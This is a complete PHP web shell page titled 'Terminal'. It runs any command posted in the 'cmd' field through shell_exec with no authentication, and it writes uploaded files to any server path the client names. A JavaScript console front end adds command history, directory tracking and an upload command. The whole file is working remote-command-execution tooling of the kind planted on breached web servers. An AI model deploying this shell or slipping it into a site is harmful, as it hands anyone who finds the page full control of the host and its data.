<?php
if (file_exists('noedit')) {} else {
if (ISSET($_POST['cmd'])) {
    $output = preg_split('/[\n]/', shell_exec($_POST['cmd']." 2>&1"));
    foreach ($output as $line) {
        echo htmlentities($line, ENT_QUOTES | ENT_HTML5, 'UTF-8') . "<br>";
    }
    die(); 
} else if (!empty($_FILES['file']['tmp_name']) && !empty($_POST['path'])) {
    $filename = $_FILES["file"]["name"];
    $path = $_POST['path'];
    if ($path != "/") {
        $path .= "/";
    } 
    if (move_uploaded_file($_FILES["file"]["tmp_name"], $path.$filename)) {
        echo htmlentities($filename) . " successfully uploaded to " . htmlentities($path);
    } else {
        echo "Error uploading " . htmlentities($filename);
    }
    die();
}
?>

<html>
<head>
<?php include 'incl.php'; ?>
<title>Terminal</title>
<link rel="shortcut icon" href="bash.png?rev=<?=time();?>" type="image/x-icon">
<link rel="stylesheet" type="text/css" href="bash.css?rev=<?=time();?>">
</head>
<body>
<div class="console">
<div class="output" id="output"></div>
<div class="input" id="input">
<form id="form" method="GET" onSubmit="sendCommand()">
<div class="username" id="username"></div>
<input class="inputtext" id="inputtext" type="text" name="cmd" autocomplete="off" autofocus>
</form>
</div>
</div>
<form id="upload" method="POST" style="display: none;">
<input type="file" name="file" id="filebrowser" onchange='uploadFile()' />
</form>
<script type="text/javascript">
var username = "";
var hostname = "";
var currentDir = "";
var previousDir = "";
var defaultDir = "";
var commandHistory = [];
var currentCommand = 0;
var inputTextElement = document.getElementById('inputtext');
var inputElement = document.getElementById("input");
var outputElement = document.getElementById("output");
var usernameElement = document.getElementById("username");
var uploadFormElement = document.getElementById("upload");
var fileBrowserElement = document.getElementById("filebrowser");
getShellInfo();

function getShellInfo() {
var request = new XMLHttpRequest();

request.onreadystatechange = function() {
if (request.readyState == XMLHttpRequest.DONE) {
var parsedResponse = request.responseText.split("<br>");
username = parsedResponse[0];
hostname = parsedResponse[1];
currentDir =  parsedResponse[2].replace(new RegExp("&sol;", "g"), "/");
defaultDir = currentDir;
usernameElement.innerHTML = "<div style='color: #00BB59; display: inline;'>"+username+"@"+hostname+"</div>:"+currentDir+"#";
updateInputWidth();
}
};

request.open("POST", "", true);
request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
request.send("cmd=whoami; hostname; pwd");
}
                        
function sendCommand() {
var request = new XMLHttpRequest();
var command = inputTextElement.value;
var originalCommand = command;
var originalDir = currentDir;
var cd = false;

commandHistory.push(originalCommand);
switchCommand(commandHistory.length);
inputTextElement.value = "";

var parsedCommand = command.split(" ");

if (parsedCommand[0] == "cd") {
cd = true;
if (parsedCommand.length == 1) {
command = "cd "+defaultDir+"; pwd";
} else if (parsedCommand[1] == "-") {
command = "cd "+previousDir+"; pwd";
} else {
command = "cd "+currentDir+"; "+command+"; pwd";
}

} else if (parsedCommand[0] == "clear") {
outputElement.innerHTML = "";
return false;
} else if (parsedCommand[0] == "upload") {
fileBrowserElement.click();
return false;
} else {
command = "cd "+currentDir+"; " + command;
}

request.onreadystatechange = function() {
if (request.readyState == XMLHttpRequest.DONE) {
if (cd) {
var parsedResponse = request.responseText.split("<br>");
previousDir = currentDir;
currentDir = parsedResponse[0].replace(new RegExp("&sol;", "g"), "/");
outputElement.innerHTML += "<div style='color:#00BB59; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+originalDir+"# "+originalCommand+"</div><br>";
usernameElement.innerHTML = "<div style='color: #00BB59; display: inline;'>"+username+"@"+hostname+"</div>:"+currentDir+"#";
} else {
outputElement.innerHTML += "<div style='color:#00BB59; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+currentDir+"# "+originalCommand+"</div><br>" + request.responseText.replace(new RegExp("<br><br>$"), "<br>");
outputElement.scrollTop = outputElement.scrollHeight;
}
updateInputWidth();
}
};

request.open("POST", "", true);
request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
request.send("cmd="+encodeURIComponent(command));
return false;
}

function uploadFile() {
var formData = new FormData();
formData.append('file', fileBrowserElement.files[0], fileBrowserElement.files[0].name);
formData.append('path', currentDir);

var request = new XMLHttpRequest();

request.onreadystatechange = function() {
if (request.readyState == XMLHttpRequest.DONE) {
outputElement.innerHTML += request.responseText+"<br>";
}
};

request.open("POST", "", true);
request.send(formData);
outputElement.innerHTML += "<div style='color:#00BB59; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+currentDir+"# Uploading "+fileBrowserElement.files[0].name+"...</div><br>";
}

function updateInputWidth() {
inputTextElement.style.width = inputElement.clientWidth - usernameElement.clientWidth - 15;
}

document.onkeydown = checkForArrowKeys;

function checkForArrowKeys(e) {
e = e || window.event;

if (e.keyCode == '38') {
previousCommand();
} else if (e.keyCode == '40') {
nextCommand();
}
}

function previousCommand() {
if (currentCommand != 0) {
switchCommand(currentCommand-1);
}
}

function nextCommand() {
if (currentCommand != commandHistory.length) {
switchCommand(currentCommand+1);
}
}

function switchCommand(newCommand) {
currentCommand = newCommand;

if (currentCommand == commandHistory.length) {
inputTextElement.value = "";
} else {
inputTextElement.value = commandHistory[currentCommand];
setTimeout(function(){ inputTextElement.selectionStart = inputTextElement.selectionEnd = 10000; }, 0);
}
}

document.getElementById("form").addEventListener("submit", function(event){
event.preventDefault()
});
</script>
</body>
</html>
<?php } ?>
